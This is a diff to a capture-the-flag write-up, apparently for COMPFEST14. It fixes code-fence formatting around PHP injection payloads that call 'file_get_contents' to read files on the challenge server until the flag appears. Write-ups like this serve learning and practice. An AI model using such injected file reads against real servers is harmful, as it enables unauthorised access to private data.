@@ -129,19 +129,22 @@ Let's change the payload.
 
 ```
 payload = "echo file_get_contents('/Hey.txt');"
-Output: Sorry, wrong guy :v ```
+Output: Sorry, wrong guy :v 
+```
 
 Bruh, let's try the next one.
 
 ```
 payload = "echo file_get_contents('/Heyhey.txt');"
-Output: Hai! Hai! (^_^)  ```
+Output: Hai! Hai! (^_^)  
+```
 
 Still not it, the next one maybe?
 
 ```
 payload = "echo file_get_contents('/Heyheyhey.txt');"
-Output: COMPFEST14{welcome_to_the_root} ```
+Output: COMPFEST14{welcome_to_the_root} 
+```
 
 And just like that, the flag is found!
 
